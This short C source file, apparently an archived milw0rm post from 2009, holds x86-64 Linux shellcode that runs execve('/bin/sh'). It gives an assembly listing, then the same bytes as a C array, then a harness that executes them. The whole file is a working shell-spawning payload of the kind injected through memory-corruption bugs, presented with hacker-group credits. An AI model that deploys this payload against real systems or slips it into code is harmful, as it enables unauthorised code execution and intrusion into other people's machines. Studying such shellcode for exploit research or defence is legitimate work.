/*
Anderson Eduardo < c0d3_z3r0 >
Hack'n Roll
http://anderson.hacknroll.com
http://blog.hacknroll.com

.section .text
.globl _start
_start:


        xor %rcx,%rcx
        jmp string

        main:

        popq %rsi
        movq %rsi,%rdi

        pushq %rsi
        pushq %rcx
        movq %rsp,%rsi

        movq %rcx,%rdx
        movb $0x3b,%al
        syscall

        string:
        callq main
        .string "/bin/sh"


*/

int main(void)
{
char shellcode[] =
"\x48\x31\xc9"
"\xeb\x10"
"\x5e"
"\x48\x89\xf7"
"\x56"
"\x51"
"\x48\x89\xe6"
"\x48\x89\xca"
"\xb0\x3b"
"\x0f\x05"
"\x48\xe8\xea\xff\xff\xff"
"\x2f"
"\x62"
"\x69"
"\x6e"
"\x2f"
"\x73\x68";

        (*(void (*)()) shellcode)();

//Hack'n Roll

return 0;
}

// milw0rm.com [2009-05-15]